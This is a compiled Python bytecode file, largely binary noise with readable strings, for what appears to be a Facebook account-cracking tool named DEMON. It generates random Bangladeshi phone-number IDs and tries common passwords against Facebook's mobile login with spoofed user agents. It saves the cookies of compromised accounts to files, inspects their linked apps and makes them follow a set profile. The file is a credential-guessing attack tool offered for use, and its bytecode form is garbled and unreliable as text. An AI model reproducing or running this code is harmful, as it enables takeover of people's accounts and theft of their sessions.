�
    �^�e�,  �                   ��  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	 e j
        d�  �          e j        d�  �         d dlmZ d dlmZ d dlZd dlmZ d dlmZ d dlmZ d dl Z d dlZ	 d dlZn#   e j
        d�  �         d dlZY nxY wd d	lmZ d dlmZ 	 d dlZd d
lmZ d dlZd dlmZ n+# e$ r#  e j
        d�  �          e j
        d�  �         Y nw xY wd dlmZ  d� Z!d dl m
Z"  e# e �   �         d         �  �        Z$e$dk    re$dz
  Z%dZ&ne$Z%dZ&d� Z'dZ(dZ)dZ*dZ+dZ,dZ-dZ.dZ/dZ0dZ1dZ2dZ3dZ4d Z5 ej6        �   �         Z6e6�7                    d!�  �        Z8 ej6        �   �         Z9e9j:        Z;e9j<        Z=e9j>        Z? ej@        �   �         Z@e.e/e0e1e2e3e4e5gZA ejB        eA�  �        ZC ej6        �   �         Z6e6�7                    d!�  �        Z8 ej6        �   �         Z9e9j:        Z;e9j<        Z=e9j>        Z? ej@        �   �         Z@g g g cZDZEZFg ZGg ZHd"� ZId#� ZJ eKd$�  �        D ]�ZLd%ZM ejB        g d&��  �        ZNd'ZO ejB        g d(��  �        ZP ejQ        d)d*�  �        ZR ejB        g d(��  �        ZSd+ZT ejQ        d,d-�  �        ZUd.ZV ejQ        d/d0�  �        ZW ejQ        d1d2�  �        ZXd3ZYeM� d4eN� d5eO� eP� eR� eS� d6eT� eU� d7eV� d7eW� d7eX� d4eY� �ZZeH�[                    eZ�  �         �� G d8� d9�  �        Z\ e j
        d:�  �          e j
        d;�  �          e!d<�  �         d=Z]	  e^d>�  �         d?Z_d@Z`d@Z` eae_�  �        e`v r e j
        d;�  �         n	 n#   e^dA�  �         Y nxY wdB� ZbdC� Zcd adg aeg afdD� ZgdE� Z!dF� Zh eg�   �          dS )G�    Nzgit pullzhpip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests)�BeautifulSoup)�date)�datetime)�sleepzpip install rich)�track)�ThreadPoolExecutor)�ConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullzpip install bs4)�	localtimec                 �p   � t          t          d�  �        | ��  �        D ]}t          j        d�  �         �d S )Ni�  )�descriptiong{�G�z�?)r   �range�timer   )�dark�is     �FOF.py�errorr      sA   � ��5��:�:�$�/�/�/� � ���
�4������ �    )�system�   �   �PM�AMc                 �   � g d�}|D ]J}t          d| z   |z   �  �        f t          j        �                    �   �          t	          j        d�  �         �Kd S )N)z.   z..  z... z.... ��   )�print�sys�stdout�flushr   r   )�text�titik�os      r   �dynamicr#   (   sa   � �*�*�*�E�� )� )���d�4�i��k������
������4�:�a�=�=�=�=�)� )r   z[1;91mz[1;97mz[1;32mz[1;33mz[1;34mz[1;35mz[1;92mz[1;94mz[1;95mz[1;96mz[0mz%H:%Mc           
      �  � | �                     dd|i��  �        j        }t          |d�  �        } |j        dd��  �        }d� |�                    d	�  �        D �   �         }t          |�  �        d
k    r1t          dt          t          t          t          t          fz  �  �         n{t          dt          � �t          z  �  �         t          t          |�  �        �  �        D ]?}t          dt          |dz   ||         �                    dd�  �        t          fz  �  �         �@| �                     dd|i��  �        j        }t          |d�  �        } |j        dd��  �        }d� |�                    d	�  �        D �   �         }t          |�  �        d
k    r2t          dt          t          t          t          t          fz  �  �         d S t          dt          � �t          z  �  �         t          t          |�  �        �  �        D ]?}t          dt          |dz   ||         �                    dd�  �        t          fz  �  �         �@t          d�  �         d S )Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active�cookie��cookies�html.parser�form�post)�methodc                 �   � g | ]	}|j         ��
S � �r    ��.0r   s     r   �
<listcomp>zcek_apk.<locals>.<listcomp>U   �   � �-�-�-�q�A�F�-�-�-r   �h3r   z.%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  u'   [😍] %s [1;95m YOUR ACTIVE APPS   :z[%s%s] %s%sr   zDitambahkan padaz Ditambahkan padaz>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivec                 �   � g | ]	}|j         ��
S r-   r.   r/   s     r   r1   zcek_apk.<locals>.<listcomp>a   r2   r   z8%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           
u)   [🥵] %s [1;95m YOUR EXPIRED APPS    :�Kedaluwarsaz Kedaluwarsa� )�getr    r   �find�find_all�lenr   �N�M�WHITE�GREENr   �replace)�session�coki�w�sop�x�gamer   s          r   �cek_apkrF   Q   s%  � ��k�k�P�Zb�cg�Yh�k�i�i�n�A�
��-�
(�
(�C�����v�&�&�&�A�-�-�A�J�J�t�,�,�-�-�-�D�
�4�y�y�!�|�|��@�!�A�a��!��L�M�M�M�M��C�E�C�C�U�K�L�L�L��s�4�y�y�!�!� 	f� 	f�A��"�A�a��c�$�q�'�/�/�:L�M`�*a�*a�bc�#d�d�e�e�e�e� �k�k�R�\d�ei�[j�k�k�k�p�A�
��-�
(�
(�C�����v�&�&�&�A�-�-�A�J�J�t�,�,�-�-�-�D�
�4�y�y�!�|�|��K�Q�q�QR�ST�UV�K�W�X�X�X�X�X��E�e�E�E�q�I�J�J�J��s�4�y�y�!�!� 	� 	�A��"�A�a��c�$�q�'�/�/�-��*W�*W�XY�#Z�Z�[�[�[�[��"�I�I�I�I�Ir   c                 ��   � t           |j        dd|ifi d��j        d�  �        } |j        d
i d���                    d�  �        } |j        d	t	          |�  �        z   d|ifi d��j         d S )Nz:https://mbasic.facebook.com/profile.php?id=100015315258519r%   r&   r(   �a�Ikuti)�string�hrefzhttps://mbasic.facebook.com)rH   rI   )r   r7   r    r8   �str)�selfr@   rA   �rr7   s        r   �followrO   k   s�   � ��+�'�+�&b��d�e� .� .� ,�.� .�.2�M�C� C���a�f�1�1�[�1�1�5�5�f�=�=�����1�C��H�H�<��d�?� 	.� 	.� ,�	.� 	.�.2�d�d�dr   i'  zMozilla/5.0 (Linux; U; Android)�3�4�5�6�7�8�9�10�11�12�13�14�15�16�17z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�Lr<   r;   �O�P�Q�R�S�T�U�V�W�X�Y�Zr   i�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �d   �0ih  i$  �(   �   zMobile Safari/537.36� z; z) �.c                   �   � e Zd Zd� ZdS )�jalanc                 �   � |dz   D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S )N�
g����MbP?)r   r   �writer   r   r   )rM   �z�es      r   �__init__zjalan.__init__�   s\   � ��T�� 	� 	�A��J���Q�����J�������J�u�����	� 	r   N)�__name__�
__module__�__qualname__r�   r-   r   r   r   r   �   s#   � � � � � �� � � � r   r   zpkg install figlet�clearzSTARTING PLEASE WAITu�  
[1;32m8888b.  888888 8b    d8  dP"Yb  88b 88 
[1;32m 8I  Yb 88__   88b  d88 dP   Yb 88Yb88 
[1;32m 8I  dY 88""   88YbdP88 Yb   dP 88 Y88 
[1;32m8888Y"  888888 88 YY 88  YbodP  88  Y8 
[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[1;37m[+] AUTHOR   : [1;32mMOHAMMAD JOBAID        
[1;37m[+] AUTHOR   : [1;32mAHMED FARHAN               
[1;37m[+] GITHUB   : [1;32mDEMON-404             
[1;37m[+] TOOLS    : [1;32mFREE     [1;37m              
[1;37m[+] VERSION  : [1;32m1.6  [1;37m                 
[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━z)

[1;33mLOADING ASSEST FILES ... [0;97mg������@z5.2z*
[1;31mNO INTERNET CONNECTION ... [0;97mc                  �$   � t          d�  �         d S )Nuy   [1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━)r   r-   r   r   �linexr�   �   s)   � ��  M�  	N�  	N�  	N�  	N�  	Nr   c                  �V   � t          j        d�  �         t          t          �  �         d S )Nr�   )�osr   r   �logor-   r   r   r�   r�   �   s!   � ��I�g����	�$�K�K�K�K�Kr   c                  �8  � t          j        d�  �         t          t          �  �         t          d�  �         t          d�  �         t	          �   �          t          d�  �        } | dv rt          �   �          d S | dv rt          �   �          d S t          �   �          d S )Nr�   z[1;37m[1] [1;32mRANDOM CRACKz[1;37m[0] [1;32mEXIT TOOLz[1;37m[?] [1;32mSELECT MENU: )�1�01)ry   �00)r�   r   r   r�   r�   �inputr   �exit)r   s    r   �ERRORr�   �   s�   � ��I�g����u�T�{�{�{�	�
0�1�1�1�	�
-�.�.�.�	�G�G�G�	�6�	7�	7�D��j���������	�
�	�	�4�6�6�6�6�6�	�����r   c                  �.  � g } g }t           j         t           j         t          j        d�  �         t	          t
          �  �         t	          d�  �         t          �   �          t          d�  �        }t          j        d�  �         t	          t
          �  �         t	          d�  �         t          �   �          t          t          d�  �        �  �        }t          �   �          t          d�  �        }|dv rt          �
                    d�  �         nt          �
                    d�  �         t          |�  �        D ]C}d	�                    d
� t          d�  �        D �   �         �  �        }| �
                    |�  �         �Dt          d��  �        5 }t          �   �          t          t!          | �  �        �  �        }t	          d|z   �  �         t	          d�  �         t	          d�  �         t	          d�  �         t          �   �          | D ]<}	|	ddddddddddddddd d!d"d#d$d%d&g}
||	z   }|�                    t$          ||
|�  �         �=	 d d d �  �         n# 1 swxY w Y   t	          d'�  �         t	          d(�  �         t	          d)�  �         t          �   �          d S )*Nr�   z7[1;37m[=] [1;32mBD CODE : 017 | 019 | 016 | 018 | 013z[1;37m[?] [1;32mCHOOSE : z7[1;37m[=] [1;32mEXAMPLE : 3000 | 5000 | 10000 | 50000zQ[1;37m[?] [1;32mYou Want To Show Cp Account?[[1;32mY[1;34m/[1;31mN[1;32m]: )�yru   �yes�Yesr�   r�   �nr6   c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S )N)�random�choicerJ   �digits)r0   �_s     r   �	<genexpr>zerror.<locals>.<genexpr>�   s.   � � � �E�E�q�f�m�F�M�2�2�E�E�E�E�E�Er   �   rz   )�max_workersu"   [1;37m[=️] [1;32mChoice Code: u.   [1;37m[=️] [1;32mCrack Process Has Startedu!   [1;37m[=️] [1;32mWait And Seez.[1;37m[=] [1;32mUse Flight Mode For Speed Up�
bangladesh�jannat�maisha�tabassum�sadia�sadiya�mim�sumiya�sumaiya�farhan�shuvo�asifz
i love you�
Bangladeshu   ১২৩৪৫৬u   ১২৩৪৫৬৭৮�102030�203040�77889900z@@@###z@#@#@#z!CRACK PROCESS HAS BEEN COMPLETED zOk Ids Saved in /DEMON-OK.txtzCp Ids Saved in /DEMON-CP.txt)r�   �getuid�geteuidr   r   r�   r�   r�   �int�cp_cpx�appendr   �join�
ThreadPoolr�   rL   r:   �submit�mumitx)�user�twf�code�limit�xd_cp�nmbr�nmp�ahare�tl�fuck�pwx�uids               r   r   r   �   s�  � �	�D�	�C��I�I��J�J��I�g����	�$�K�K�K�	�
I�J�J�J�	�G�G�G��4�5�5�D��I�g����	�$�K�K�K�	�
I�J�J�J�	�G�G�G���9�:�:�;�;�E�	�G�G�G�
�v�
w�
w�E��)�)�)�&�-�-��*<�*<�*<�*<�	���s�	�	�	��e��� � ���g�g�E�E�E�!�H�H�E�E�E�E�E�����C�����	��	#�	#�	#� ,�u�������T���^�^���8��=�>�>�>��D�E�E�E��7�8�8�8��D�E�E�E������ 	,� 	,�D���X�h�z�'�(�SX�Ya�bk�lt�u|�  ~D�  EQ�  R^�  _s�  tN�  OW�  X`�  ak�  lt�  u}�  ~�C��t�)�C��L�L���C��+�+�+�+�	,�,� ,� ,� ,� ,� ,� ,� ,� ,� ,� ,���� ,� ,� ,� ,� 
�
-�.�.�.�	�
)�*�*�*�	�
)�*�*�*�	�G�G�G�G�Gs   �B7I�I�Ic                 �  � 	 |D �]G}t          j        t          �  �        }t          j        �   �         }|�                    d�  �        j        }t          j        dt          |�  �        �  �        �
                    d�  �        t          j        dt          |�  �        �  �        �
                    d�  �        t          j        dt          |�  �        �  �        �
                    d�  �        t          j        dt          |�  �        �  �        �
                    d�  �        dd| |dd	�	}i d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d"�d#d$�d%d&�d'd(�d)d*�d+d,d-dd.d/d0��}|�                    d1||�2�  �        j        }	|j        �                    �   �         �                    �   �         }
d3|
v r�d4�                    d5� |j        �                    �   �         �                    �   �         D �   �         �  �        }|d6d7�         }t#          d8| z   d9z   |z   d:z   �  �         t#          d;|z   d<z   �  �         t%          ||�  �         t'          d=d>�  �        �                    |d9z   |z   d?z   �  �         t*          �                    |�  �          n�d@|
v r�d4�                    dA� |j        �                    �   �         �                    �   �         D �   �         �  �        }|dBdC�         }dDt.          v rt#          dE| z   d9z   |z   d:z   �  �         t'          dFd>�  �        �                    |d9z   |z   dGz   �  �         t0          �                    |�  �          n��It2          dz  at4          j        �                    dHt8          �dIt2          �dJ|�dKt;          t*          �  �        �dLt;          t0          �  �        �dM��  �        f t4          j        �                    �   �          d S #  Y d S xY w)NNzhttps://m.facebook.comzname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"zname="m_ts" value="(.*?)"zname="li" value="(.*?)"ry   zLog In)	�lsd�jazoest�m_ts�li�
try_number�unrecognized_tries�email�pass�login�	authorityzm.facebook.comr+   �POST�pathz:/login/device-based/login/async/?refsrc=deprecated&lwv=100�scheme�https�acceptz*/*z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7zaccept-languagezen-US,en;q=0.9zcache-controlz	max-age=0�dprr�   zsec-ch-prefers-color-scheme�lightz	sec-ch-uazA"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"zsec-ch-ua-full-version-listz]"Chromium";v="122.0.6261.112", "Not(A:Brand";v="24.0.0.0", "Google Chrome";v="122.0.6261.112"zsec-ch-ua-mobilez?0zsec-ch-ua-modelz""zsec-ch-ua-platformz"linux"zsec-ch-ua-platform-versionz"10.0.0"zsec-fetch-dest�document�navigatezsame-originz?1zoMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36�801)zsec-fetch-modezsec-fetch-sitezsec-fetch-userzupgrade-insecure-requestsz
user-agentzviewport-widthzPhttps://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100)�data�headers�c_user�;c                 �$   � g | ]\  }}|d z   |z   ��S ��=r-   �r0   �key�values      r   r1   zmumitx.<locals>.<listcomp>  �$   � �a�a�a���U�s�3�w�u�}�a�a�ar   �   �   z[1;32m[DEMON-OK] z | z [0;97mz[1;32m[COOKIE] [1;37mr6   z/sdcard/DEMON-OK.txtrH   r�   �
checkpointc                 �$   � g | ]\  }}|d z   |z   ��S r�   r-   r�   s      r   r1   zmumitx.<locals>.<listcomp>  r�   r   �   �'   r�   z[1;30m[DEMON-CP]  z/sdcard/DEMON-CP.txtz 
zz&[0;97m[[0;96mDEMON[0;97m]..[[0;94m�/z7[0;97m]..[[0;92mOK[0;97m/[0;91mCP[0;97m]..[[0;92mz[0;97m/[0;91mz	[0;97m] )r�   r�   �ugen�requests�Sessionr7   r    �re�searchrL   �groupr*   r'   �get_dict�keysr�   �itemsr   rF   �openr�   �oksr�   r�   �cps�loopr   r   rf   r:   r   )r�   r�   r�   �ps�pror@   �free_fb�log_data�header_freefb�lo�log_cookiesrA   �cids                r   r�   r�   �   s�  � �
A�� ;	� ;	�B��-��%�%�C��&�(�(�G��k�k�":�;�;�@�G��i� :�C��L�L�I�I�O�O�PQ�R�R��i� >��G���M�M�S�S�TU�V�V��9�8�#�g�,�,�G�G�M�M�a�P�P���4�c�'�l�l�C�C�I�I�!�L�L��!$����	� 	�H���!���V�� �G�� �W�	�
 �e�� �  X�� �'�� �[�� 
�3�� "�7�� �T�� "�  $C�� ��� �t�� �)��  !�*�!�" �j�#�$ !�#��!$� D��/� � �M�2 ���p�v~�  HU��  V�  V�  [�B���0�0�2�2�7�7�9�9�K��;�&�&��X�X�a�a�g�o�>V�>V�>X�>X�>^�>^�>`�>`�a�a�a�b�b���1�R�4�j���1�3�6��=�r�A�=�P�Q�Q�Q��5�d�:�B�>�?�?�?����%�%�%��+�S�1�1�7�7��U��2��d�9J�K�K�K��
�
�3��������,�,��X�X�a�a�g�o�>V�>V�>X�>X�>^�>^�>`�>`�a�a�a�b�b���2�b�5�k���&�=�=��3�S�8�%�?��C�]�R�S�S�S��+�S�1�1�7�7��U��2��e�9K�L�L�L��
�
�3��������a����
����  IJ�  IJ�  IJ�  KO�  KO�  KO�  PR�  PR�  PR�  SV�  WZ�  S[�  S[�  S[�  S[�  \_�  `c�  \d�  \d�  \d�  \d�  e�  	f�  	f�  	g�  	g��
���������������s   �OO �O)ir�   r   r   �jsonr�   r�   rJ   �platform�base64�uuidr   �systwm�bs4r   rC   r�   �ressr   r   r   �rich�rich.progressr   �waktu�concurrent.futuresr   r�   �	mechanize�requests.exceptionsr	   �ModuleNotFoundErrorr
   �ltr   �cmdr�   �ltxrH   �tagr#   �REDr=   r>   �YELLOW�BLUE�ORANGErl   r<   rf   ri   r`   rq   rk   r;   �now�strftime�	dt_string�current�year�ta�month�bu�day�ha�today�my_colorr�   �warna�mtdr�   �cokix�ugen2r�   rF   rO   r   �xd�aa�b�c�d�	randranger�   �f�g�hr   �j�k�l�uaku2r�   r   r�   r   �v�updaterL   r�   r�   r�   r�   r�   r�   r�   r-   r   r   �<module>r9     sa  �� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� 	��	�*� � � � 	��	�
t� u� u� u� $� $� $� $� $� $� � � � � � � � � � � � � � � � � � � � � � � � � � � � � ����������K�K�K�K����B�I� �!�!�!��K�K�K�K�K���� � � � � � � � � � � � �!��O�O�O�C�C�C�C�C�C�����3�3�3�3�3�3�3��� !� !� !��B�I�I�J�J�J��B�I�� � � � � �!���� !�  �  �  �  �  �� � � � � � � � �	�c�"�"�$�$�q�'�l�l����8�8��B��A�
�C�C��A�
�C�)� )� )� ������	����	�������������������h�l�n�n���L�L��!�!�	�
�(�,�.�.���\���]���[����
�����A�q�!�Q��1�a������h�����h�l�n�n���L�L��!�!�	�
�(�,�.�.���\���]���[����
�����B�r� ��F�5������ � �43� 3� 3� �%��,�,� � �B�'�B��f�m�Y�Y�Y�Z�Z�A��A��f�m�  V�  V�  V�  W�  W�A��f��q�#���A��f�m�  V�  V�  V�  W�  W�A�6�A��f��r�#���A�	�A��f��t�D�!�!�A��f��r�#���A��A��<�<�1�<�<��<�1�<�a�<��<�<�a�<��<�<�Q�<�<��<�<�Q�<�<��<�<�E��K�K������� � � � � � � � 
��	�
� � � � 	��	�'� � � � ��� � � �	@��B��5�	<�=�=�=�
�1��6��6�	�c�!�f�f�����r�y��������� A�u�u�@�A�A�A�A�A����N� N� N�� � �
 	������� � �%� %� %�NF� F� F�R ������s*   �4A9 �9B�!B6 �6%C�C�0M �M